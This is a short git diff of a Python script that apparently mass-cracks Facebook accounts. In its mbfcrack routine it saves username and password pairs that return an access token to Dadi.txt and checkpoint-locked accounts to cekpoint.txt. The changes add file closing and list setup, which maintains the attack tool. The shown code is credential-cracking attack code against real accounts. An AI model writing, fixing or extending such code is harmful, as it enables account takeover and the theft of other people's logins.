@@ -19,6 +19,8 @@ dados = []
 gagal = []
 oradadi = []
 threads = []
+cekpo = []
+sukses = []
 
 def mbf():
 
@@ -73,12 +75,14 @@ def mbfcrack():
             if "access_token" in jsl:
                 sukses = open("Dadi.txt", 'w')
                 sukses.write(user + " | " + password + "\n")
-                dados.append(h+" [OK]" + pu + user + " | " + a + password)
+                sukses.close()
+                dados.append(h+" [OK] " + pu + user + " | " + a + password)
                 count =+ 1
             else:
                 if "www.facebook" in jsl["error_msg"]:
                     cekpo = open("cekpoint.txt", "w")
                     cekpo.write(user + " | " + password + "\n")
+                    cekpo.close()
                     gagal.append(m+" [CP] " + pu + user + " | " + m + password)
                     count =+ 1
                 else:
